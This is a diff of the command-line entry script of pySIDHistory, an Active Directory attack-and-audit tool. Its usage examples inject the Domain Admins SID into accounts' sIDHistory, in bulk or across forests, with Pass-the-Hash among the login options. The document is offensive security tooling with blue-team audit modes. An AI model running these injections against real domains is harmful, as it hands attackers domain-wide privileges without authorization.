@@ -1,7 +1,12 @@
 #!/usr/bin/env python3
 """
-SID History Attack Tool
-Main entry point for the tool.
+pySIDHistory - Remote SID History Attack & Audit Tool
+
+The first tool to perform SID History injection from a distant
+UNIX-like machine, combining LDAP and DRSUAPI (MS-DRSR opnum 20).
+
+Author: Felix Billieres (Elliot Belt)
+License: MIT - For authorized security testing only.
 """
 
 import argparse
@@ -10,98 +15,164 @@ import logging
 from typing import Optional
 
 from core import SIDHistoryAttack, AuthenticationManager
+from core.sid_utils import SIDConverter
+from core.output import OutputFormatter
 
 
-def setup_logging(verbose: bool = False):
+BANNER = r"""
+             _____ _____ ____  _   _ _     _
+ _ __  _   _/ ____|_   _|  _ \| | | (_)___| |_ ___  _ __ _   _
+| '_ \| | | \___ \  | | | | | | |_| | / __| __/ _ \| '__| | | |
+| |_) | |_| |___) | | | | |_| |  _  | \__ \ || (_) | |  | |_| |
+| .__/ \__, |____/ |___|____/|_| |_|_|___/\__\___/|_|   \__, |
+|_|    |___/                                              |___/
+        Remote SID History Attack & Audit Tool
+        MITRE ATT&CK T1134.005 | For authorized testing only
+"""
+
+
+def setup_logging(verbose: bool = False, quiet: bool = False):
     """Configure logging."""
-    level = logging.DEBUG if verbose else logging.INFO
+    if quiet:
+        level = logging.WARNING
+    elif verbose:
+        level = logging.DEBUG
+    else:
+        level = logging.INFO
+
     logging.basicConfig(
         level=level,
         format='[%(levelname)s] %(message)s',
-        handlers=[logging.StreamHandler(sys.stdout)]
+        handlers=[logging.StreamHandler(sys.stderr)]
     )
 
 
-def parse_arguments():
-    """Parse command-line arguments."""
+def build_parser():
+    """Build the argument parser."""
     parser = argparse.ArgumentParser(
-        description='SID History Attack Tool - Remotely manipulate SID History attributes in Active Directory',
+        description='pySIDHistory - Remote SID History Attack & Audit Tool',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-Authentication Methods:
-  --ntlm              NTLM with password (default)
-  --ntlm-hash         Pass-the-Hash with NT hash
-  --kerberos          Kerberos authentication (requires ticket)
-  --certificate       Pass-the-Certificate with client cert
-  --simple            SIMPLE bind (use with SSL)
+MODES:
+  Attack:  Inject SIDs into sIDHistory (--target + --source-user/--sid/--preset)
+  Remove:  Remove SIDs from sIDHistory (--target + --remove/--clear/--clean-same-domain)
+  Query:   Query sIDHistory of an object (--query)
+  Lookup:  Lookup SID of an object (--lookup)
+  Audit:   Full domain sIDHistory audit (--audit)
+  Trusts:  Enumerate domain trusts (--enum-trusts)
+  Presets: List available SID presets (--list-presets)
+  Copy:    Copy sIDHistory between objects (--target + --copy-from)
+  Bulk:    Bulk operations from file (--targets-file)
 
-Examples:
-  NTLM authentication:
-    %(prog)s -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \\
-             --target-user attacker --source-user "Domain Admins"
+INJECTION METHODS:
+  --method ldap       Direct LDAP modify (default, may be blocked by DC)
+  --method drsuapi    RPC DRSAddSidHistory (cross-forest, requires specific setup)
 
-  Pass-the-Hash:
-    %(prog)s -d DOMAIN.COM -u admin --ntlm-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
-             -dc 192.168.1.10 --target-user attacker --sid S-1-5-21-xxx-512
+EXAMPLES:
+  # Inject Domain Admins SID using preset
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
+      --target victim --preset domain-admins
 
-  Kerberos (with ticket):
-    %(prog)s -d DOMAIN.COM -dc 192.168.1.10 --kerberos \\
-             --target-user attacker --source-user Administrator
+  # Inject specific SID
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
+      --target victim --sid S-1-5-21-xxx-512
 
-  Query SID History:
-    %(prog)s -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 --query-user attacker
+  # Cross-forest injection via DRSUAPI
+  %(prog)s -d DST.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
+      --target victim --source-user admin --source-domain SRC.LOCAL --method drsuapi
 
-  Lookup SID:
-    %(prog)s -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 --lookup-user "Domain Admins"
+  # Full domain audit (blue team)
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit
+
+  # Audit with JSON output
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit -o json
+
+  # Query a user's sIDHistory
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --query victim
+
+  # Clear sIDHistory (blue team cleanup)
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --target victim --clear
+
+  # Bulk inject from file
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
+      --targets-file users.txt --sid S-1-5-21-xxx-512
         """
     )
 
-    # Connection parameters
-    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., DOMAIN.COM)')
-    parser.add_argument('-dc', '--dc-ip', required=True, help='Domain controller IP address')
-    parser.add_argument('--dc-hostname', help='Domain controller hostname (for Kerberos/SSL)')
-    parser.add_argument('--use-ssl', action='store_true', help='Use LDAPS instead of LDAP')
+    # ── Connection ──
+    conn = parser.add_argument_group('Connection')
+    conn.add_argument('-d', '--domain', required=True, help='Target domain (e.g., CORP.LOCAL)')
+    conn.add_argument('-dc', '--dc-ip', required=True, help='Domain controller IP')
+    conn.add_argument('--dc-hostname', help='DC hostname (for Kerberos/SSL)')
+    conn.add_argument('--use-ssl', action='store_true', help='Use LDAPS (port 636)')
 
-    # Authentication parameters
-    parser.add_argument('-u', '--username', help='Username for authentication')
-    parser.add_argument('-p', '--password', help='Password for authentication')
-    
-    # Authentication methods
-    auth_group = parser.add_mutually_exclusive_group()
-    auth_group.add_argument('--ntlm', action='store_true', help='Use NTLM authentication (default)')
-    auth_group.add_argument('--ntlm-hash', metavar='HASH', help='Use Pass-the-Hash (format: LM:NT or just NT)')
-    auth_group.add_argument('--kerberos', action='store_true', help='Use Kerberos authentication')
-    auth_group.add_argument('--certificate', action='store_true', help='Use client certificate')
-    auth_group.add_argument('--simple', action='store_true', help='Use SIMPLE bind')
+    # ── Authentication ──
+    auth = parser.add_argument_group('Authentication')
+    auth.add_argument('-u', '--username', help='Username')
+    auth.add_argument('-p', '--password', help='Password')
 
-    # Kerberos options
-    parser.add_argument('--ccache', help='Path to Kerberos credential cache')
+    auth_methods = parser.add_mutually_exclusive_group()
+    auth_methods.add_argument('--ntlm', action='store_true', help='NTLM auth (default)')
+    auth_methods.add_argument('--ntlm-hash', metavar='HASH', help='Pass-the-Hash (LM:NT or NT)')
+    auth_methods.add_argument('--kerberos', action='store_true', help='Kerberos auth')
+    auth_methods.add_argument('--certificate', action='store_true', help='Client certificate auth')
+    auth_methods.add_argument('--simple', action='store_true', help='SIMPLE bind')
 
-    # Certificate options
-    parser.add_argument('--cert-file', help='Path to client certificate file (.pem)')
-    parser.add_argument('--key-file', help='Path to client key file (.pem)')
+    auth.add_argument('--ccache', help='Kerberos ccache file path')
+    auth.add_argument('--cert-file', help='Client certificate (.pem)')
+    auth.add_argument('--key-file', help='Client private key (.pem)')
 
-    # Actions
-    action_group = parser.add_mutually_exclusive_group(required=True)
-    action_group.add_argument('--target-user', help='Target user to modify')
-    action_group.add_argument('--query-user', help='Query SID History of a user')
-    action_group.add_argument('--lookup-user', help='Lookup SID of a specific user')
+    # ── Actions ──
+    actions = parser.add_argument_group('Actions (pick one)')
+    action_grp = actions.add_mutually_exclusive_group(required=True)
+    action_grp.add_argument('--target', '--target-user', dest='target', help='Target object to modify')
+    action_grp.add_argument('--query', '--query-user', dest='query', help='Query sIDHistory')
+    action_grp.add_argument('--lookup', '--lookup-user', dest='lookup', help='Lookup SID')
+    action_grp.add_argument('--audit', action='store_true', help='Full domain sIDHistory audit')
+    action_grp.add_argument('--enum-trusts', action='store_true', help='Enumerate domain trusts')
+    action_grp.add_argument('--list-presets', action='store_true', help='List available SID presets')
 
-    # Modification options
-    parser.add_argument('--source-user', help='Source user whose SID to inject')
-    parser.add_argument('--source-domain', help='Source domain (for trusted domain SID injection)')
-    parser.add_argument('--sid', help='Specific SID to add/remove')
-    parser.add_argument('--remove', action='store_true', help='Remove SID instead of adding')
-    parser.add_argument('--clear', action='store_true', help='Clear all SID History')
+    # ── Modification options ──
+    mods = parser.add_argument_group('Modification options (with --target)')
+    mods.add_argument('--source-user', help='Source user whose SID to inject')
+    mods.add_argument('--source-domain', help='Source domain (cross-domain injection)')
+    mods.add_argument('--sid', help='Specific SID to add/remove')
+    mods.add_argument('--preset', help='Inject a well-known SID preset (e.g., domain-admins)')
+    mods.add_argument('--copy-from', help='Copy sIDHistory from another object')
+    mods.add_argument('--remove', action='store_true', help='Remove --sid from sIDHistory')
+    mods.add_argument('--clear', action='store_true', help='Clear all sIDHistory')
+    mods.add_argument('--clean-same-domain', action='store_true',
+                     help='Remove same-domain SIDs only (preserve migration SIDs)')
 
-    # Other options
-    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
+    # ── Injection method ──
+    method = parser.add_argument_group('Injection method')
+    method.add_argument('--method', choices=['ldap', 'drsuapi'], default='ldap',
+                       help='Injection method (default: ldap)')
 
-    return parser.parse_args()
+    # ── Bulk operations ──
+    bulk = parser.add_argument_group('Bulk operations')
+    bulk.add_argument('--targets-file', help='File with target sAMAccountNames (one per line)')
+    bulk.add_argument('--bulk-clear', action='store_true', help='Clear sIDHistory for all targets in file')
+
+    # ── Output ──
+    output = parser.add_argument_group('Output')
+    output.add_argument('-o', '--output-format', choices=['console', 'json', 'csv'],
+                       default='console', help='Output format (default: console)')
+    output.add_argument('--no-color', action='store_true', help='Disable colored output')
+    output.add_argument('--output-file', help='Write output to file')
+
+    # ── Other ──
+    other = parser.add_argument_group('Other')
+    other.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    other.add_argument('-q', '--quiet', action='store_true', help='Quiet (warnings/errors only)')
+    other.add_argument('--dry-run', action='store_true', help='Show what would be done without modifying')
+    other.add_argument('--no-banner', action='store_true', help='Suppress banner')
+
+    return parser
 
 
 def determine_auth_method(args) -> str:
-    """Determine which authentication method to use."""
+    """Determine authentication method from args."""
     if args.ntlm_hash:
         return AuthenticationManager.AUTH_NTLM_HASH
     elif args.kerberos:
@@ -110,143 +181,269 @@ def determine_auth_method(args) -> str:
         return AuthenticationManager.AUTH_CERTIFICATE
     elif args.simple:
         return AuthenticationManager.AUTH_SIMPLE
-    else:
-        return AuthenticationManager.AUTH_NTLM
+    return AuthenticationManager.AUTH_NTLM
 
 
 def validate_arguments(args, auth_method: str, parser) -> bool:
     """Validate argument combinations."""
-    # Check authentication requirements
     if auth_method == AuthenticationManager.AUTH_NTLM:
         if not args.username or not args.password:
-            parser.error("NTLM authentication requires --username and --password")
-            return False
+            parser.error("NTLM authentication requires -u/--username and -p/--password")
 
     elif auth_method == AuthenticationManager.AUTH_NTLM_HASH:
         if not args.username:
-            parser.error("Pass-the-Hash requires --username")
-            return False
+            parser.error("Pass-the-Hash requires -u/--username")
 
     elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
         if not args.cert_file or not args.key_file:
-            parser.error("Certificate authentication requires --cert-file and --key-file")
-            return False
+            parser.error("Certificate auth requires --cert-file and --key-file")
 
     elif auth_method == AuthenticationManager.AUTH_SIMPLE:
         if not args.username or not args.password:
-            parser.error("SIMPLE authentication requires --username and --password")
-            return False
+            parser.error("SIMPLE auth requires -u/--username and -p/--password")
 
-    # Check action requirements
-    if args.target_user:
-        if not (args.source_user or args.sid or args.clear):
-            parser.error("--target-user requires --source-user, --sid, or --clear")
-            return False
-        
+    # Target action validation
+    if args.target:
+        has_action = (args.source_user or args.sid or args.preset or
+                     args.clear or args.copy_from or args.clean_same_domain)
+        if not has_action and not args.targets_file:
+            parser.error("--target requires --source-user, --sid, --preset, --copy-from, "
+                        "--clear, or --clean-same-domain")
+
         if args.remove and not args.sid:
             parser.error("--remove requires --sid")
-            return False
+
+    # Bulk validation
+    if args.targets_file:
+        if not (args.sid or args.preset or args.bulk_clear):
+            parser.error("--targets-file requires --sid, --preset, or --bulk-clear")
 
     return True
 
 
-def perform_authentication(attacker: SIDHistoryAttack, args, auth_method: str) -> bool:
-    """Perform authentication with the specified method."""
-    auth_params = {
-        'use_ssl': args.use_ssl,
-        'username': args.username,
-        'password': args.password
-    }
+def build_auth_params(args, auth_method: str) -> dict:
+    """Build authentication parameters dict."""
+    params = {'use_ssl': args.use_ssl, 'username': args.username, 'password': args.password}
 
     if auth_method == AuthenticationManager.AUTH_NTLM_HASH:
-        auth_params['nt_hash'] = args.ntlm_hash
-
+        params['nt_hash'] = args.ntlm_hash
     elif auth_method == AuthenticationManager.AUTH_KERBEROS:
-        auth_params['ccache_path'] = args.ccache
-        del auth_params['username']
-        del auth_params['password']
-
+        params['ccache_path'] = args.ccache
+        params.pop('username', None)
+        params.pop('password', None)
     elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
-        auth_params['cert_file'] = args.cert_file
-        auth_params['key_file'] = args.key_file
-        del auth_params['password']
+        params['cert_file'] = args.cert_file
+        params['key_file'] = args.key_file
+        params.pop('password', None)
 
-    return attacker.authenticate(auth_method, **auth_params)
+    return params
 
 
-def handle_query_action(attacker: SIDHistoryAttack, username: str):
-    """Handle query user action."""
-    logging.info(f"Querying SID History for {username}")
+def handle_query(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
+    """Handle --query action."""
     sid_history = attacker.get_current_sid_history(username)
-    
-    if sid_history:
-        print(f"\nSID History for {username}:")
-        for sid in sid_history:
-            print(f"  {sid}")
-    else:
-        print(f"\nNo SID History found for {username}")
+    object_sid = attacker.get_user_sid(username)
+    print(formatter.format_sid_history(username, sid_history, object_sid))
 
 
-def handle_lookup_action(attacker: SIDHistoryAttack, username: str):
-    """Handle lookup user action."""
-    logging.info(f"Looking up SID for {username}")
+def handle_lookup(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
+    """Handle --lookup action."""
     sid = attacker.get_user_sid(username)
-    
     if sid:
-        print(f"\nSID for {username}: {sid}")
+        print(formatter.format_sid_lookup(username, sid))
     else:
-        print(f"\nUser {username} not found")
+        print(f"\nObject '{username}' not found")
 
 
-def handle_modify_action(attacker: SIDHistoryAttack, args) -> bool:
-    """Handle SID History modification actions."""
+def handle_audit(attacker: SIDHistoryAttack, formatter: OutputFormatter):
+    """Handle --audit action."""
+    report = attacker.full_audit()
+    if report:
+        print(formatter.format_audit_report(report))
+    else:
+        logging.error("Audit failed")
+
+
+def handle_trusts(attacker: SIDHistoryAttack, formatter: OutputFormatter):
+    """Handle --enum-trusts action."""
+    trusts = attacker.enumerate_trusts()
+    print(formatter.format_trusts(trusts))
+
+
+def handle_presets(attacker: SIDHistoryAttack, formatter: OutputFormatter):
+    """Handle --list-presets action."""
+    domain_sid = attacker.get_domain_sid()
+    if domain_sid:
+        print(formatter.format_presets(domain_sid))
+    else:
+        logging.error("Could not determine domain SID")
+
+
+def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
+                  args, dry_run: bool = False) -> bool:
+    """Handle --target action (inject, remove, clear, etc.)."""
+    target = args.target
+
+    # Clear
     if args.clear:
-        success = attacker.clear_sid_history(args.target_user)
+        if dry_run:
+            print(f"[DRY-RUN] Would clear all sIDHistory for {target}")
+            return True
+        success = attacker.clear_sid_history(target)
         if success:
-            print(f"\n[+] Successfully cleared SID History for {args.target_user}")
+            print(f"\n[+] Cleared sIDHistory for {target}")
         return success
 
-    elif args.remove and args.sid:
-        success = attacker.remove_sid_from_history(args.target_user, args.sid)
+    # Clean same-domain only
+    if args.clean_same_domain:
+        if dry_run:
+            current = attacker.get_current_sid_history(target)
+            domain_sid = attacker.get_domain_sid()
+            to_remove = [s for s in current if domain_sid and SIDConverter.is_same_domain_sid(s, domain_sid)]
+            print(f"[DRY-RUN] Would remove {len(to_remove)} same-domain SIDs from {target}:")
+            for s in to_remove:
+                print(f"  {s} ({SIDConverter.resolve_sid_name(s, domain_sid)})")
+            return True
+        success = attacker.clean_same_domain_sids(target)
         if success:
-            print(f"\n[+] Successfully removed SID from {args.target_user}")
+            print(f"\n[+] Cleaned same-domain SIDs from {target}")
         return success
 
+    # Remove specific SID
+    if args.remove and args.sid:
+        if dry_run:
+            print(f"[DRY-RUN] Would remove SID {args.sid} from {target}")
+            return True
+        success = attacker.remove_sid_from_history(target, args.sid)
+        if success:
+            print(f"\n[+] Removed SID from {target}")
+        return success
+
+    # Copy from another object
+    if args.copy_from:
+        if dry_run:
+            source_hist = attacker.get_current_sid_history(args.copy_from)
+            print(f"[DRY-RUN] Would copy {len(source_hist)} SIDs from {args.copy_from} to {target}:")
+            for s in source_hist:
+                print(f"  {s}")
+            return True
+        success = attacker.copy_sid_history(args.copy_from, target)
+        if success:
+            print(f"\n[+] Copied sIDHistory from {args.copy_from} to {target}")
+        return success
+
+    # Injection
+    if dry_run:
+        sid = _resolve_injection_sid(attacker, args)
+        if sid:
+            name = SIDConverter.resolve_sid_name(sid, attacker.get_domain_sid())
+            print(f"[DRY-RUN] Would inject SID {sid} ({name}) into {target}")
+            print(f"[DRY-RUN] Method: {args.method}")
+        return True
+
+    if args.preset:
+        success = attacker.add_sid_preset(target, args.preset)
+    elif args.source_user:
+        success = attacker.inject_sid_history(
+            target, args.source_user,
+            source_domain=args.source_domain,
+            method=args.method
+        )
+    elif args.sid:
+        success = attacker.add_sid_to_history(target, args.sid, method=args.method)
     else:
-        # Add SID
-        if args.source_user:
-            success = attacker.inject_sid_history(
-                args.target_user, 
-                args.source_user,
-                source_domain=args.source_domain
-            )
-        else:
-            success = attacker.add_sid_to_history(args.target_user, args.sid)
+        logging.error("No injection source specified")
+        return False
 
-        if success:
-            print(f"\n[+] SID History successfully modified")
-            
-            # Show updated history
-            updated_history = attacker.get_current_sid_history(args.target_user)
-            if updated_history:
-                print(f"\nUpdated SID History for {args.target_user}:")
-                for sid in updated_history:
-                    print(f"  {sid}")
-        
-        return success
+    if success:
+        print(f"\n[+] sIDHistory modified successfully")
+        # Show updated history
+        updated = attacker.get_current_sid_history(target)
+        if updated:
+            domain_sid = attacker.get_domain_sid()
+            print(formatter.format_sid_history(target, updated))
+
+    return success
+
+
+def handle_bulk(attacker: SIDHistoryAttack, args, dry_run: bool = False) -> bool:
+    """Handle --targets-file bulk operations."""
+    try:
+        with open(args.targets_file, 'r') as f:
+            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    except FileNotFoundError:
+        logging.error(f"File not found: {args.targets_file}")
+        return False
+
+    logging.info(f"Loaded {len(targets)} targets from {args.targets_file}")
+
+    if args.bulk_clear:
+        if dry_run:
+            print(f"[DRY-RUN] Would clear sIDHistory for {len(targets)} objects")
+            return True
+        results = attacker.bulk_clear(targets)
+    else:
+        sid = None
+        if args.sid:
+            sid = args.sid
+        elif args.preset:
+            sid = attacker.resolve_preset(args.preset)
+
+        if not sid:
+            logging.error("No SID to inject (use --sid or --preset)")
+            return False
+
+        if dry_run:
+            name = SIDConverter.resolve_sid_name(sid, attacker.get_domain_sid())
+            print(f"[DRY-RUN] Would inject {sid} ({name}) into {len(targets)} objects")
+            return True
+
+        results = attacker.bulk_inject(targets, sid)
+
+    # Report results
+    success_count = sum(1 for v in results.values() if v)
+    fail_count = len(results) - success_count
+
+    print(f"\nBulk operation complete: {success_count} succeeded, {fail_count} failed")
+    if fail_count > 0:
+        print("Failed targets:")
+        for target, ok in results.items():
+            if not ok:
+                print(f"  - {target}")
+
+    return fail_count == 0
+
+
+def _resolve_injection_sid(attacker: SIDHistoryAttack, args) -> Optional[str]:
+    """Resolve what SID would be injected based on args."""
+    if args.sid:
+        return args.sid
+    elif args.preset:
+        return attacker.resolve_preset(args.preset)
+    elif args.source_user:
+        return attacker.get_user_sid(args.source_user)
+    return None
 
 
 def main():
     """Main entry point."""
-    args = parse_arguments()
-    setup_logging(args.verbose)
+    parser = build_parser()
+    args = parser.parse_args()
+
+    setup_logging(args.verbose, args.quiet)
+
+    if not args.no_banner and not args.quiet and args.output_format == 'console':
+        print(BANNER, file=sys.stderr)
 
     auth_method = determine_auth_method(args)
-    
-    if not validate_arguments(args, auth_method, argparse.ArgumentParser()):
-        sys.exit(1)
+    validate_arguments(args, auth_method, parser)
 
-    # Initialize attack tool
+    # Handle --list-presets without auth (just needs domain SID format)
+    if args.list_presets:
+        # Still need to connect to get domain SID
+        pass
+
+    # Initialize
     attacker = SIDHistoryAttack(
         dc_ip=args.dc_ip,
         domain=args.domain,
@@ -254,37 +451,74 @@ def main():
     )
 
     # Authenticate
-    if not perform_authentication(attacker, args, auth_method):
-        logging.error("Failed to connect to domain controller")
+    auth_params = build_auth_params(args, auth_method)
+    if not attacker.authenticate(auth_method, **auth_params):
+        logging.error("Authentication failed")
         sys.exit(1)
 
+    # Setup formatter
+    formatter = OutputFormatter(
+        format_type=args.output_format,
+        no_color=args.no_color,
+        domain_sid=attacker.get_domain_sid()
+    )
+
+    # Output redirect
+    output_file = None
+    if args.output_file:
+        try:
+            output_file = open(args.output_file, 'w')
+            # Redirect print to file
+            import builtins
+            original_print = builtins.print
+            def file_print(*a, **kw):
+                kw['file'] = output_file
+                original_print(*a, **kw)
+            builtins.print = file_print
+        except Exception as e:
+            logging.error(f"Cannot open output file: {e}")
+
     try:
-        # Perform requested action
-        if args.query_user:
-            handle_query_action(attacker, args.query_user)
-            sys.exit(0)
+        # ── Execute action ──
+        if args.query:
+            handle_query(attacker, formatter, args.query)
 
-        elif args.lookup_user:
-            handle_lookup_action(attacker, args.lookup_user)
-            sys.exit(0)
+        elif args.lookup:
+            handle_lookup(attacker, formatter, args.lookup)
 
-        elif args.target_user:
-            success = handle_modify_action(attacker, args)
+        elif args.audit:
+            handle_audit(attacker, formatter)
+
+        elif args.enum_trusts:
+            handle_trusts(attacker, formatter)
+
+        elif args.list_presets:
+            handle_presets(attacker, formatter)
+
+        elif args.targets_file:
+            success = handle_bulk(attacker, args, dry_run=args.dry_run)
+            sys.exit(0 if success else 1)
+
+        elif args.target:
+            success = handle_target(attacker, formatter, args, dry_run=args.dry_run)
             sys.exit(0 if success else 1)
 
     except KeyboardInterrupt:
-        logging.info("\nOperation cancelled by user")
+        logging.info("\nCancelled by user")
         sys.exit(130)
     except Exception as e:
-        logging.error(f"Unexpected error: {e}")
+        logging.error(f"Error: {e}")
         if args.verbose:
             import traceback
             traceback.print_exc()
         sys.exit(1)
     finally:
         attacker.disconnect()
+        if output_file:
+            output_file.close()
+            import builtins
+            builtins.print = original_print
 
 
 if __name__ == '__main__':
     main()
-
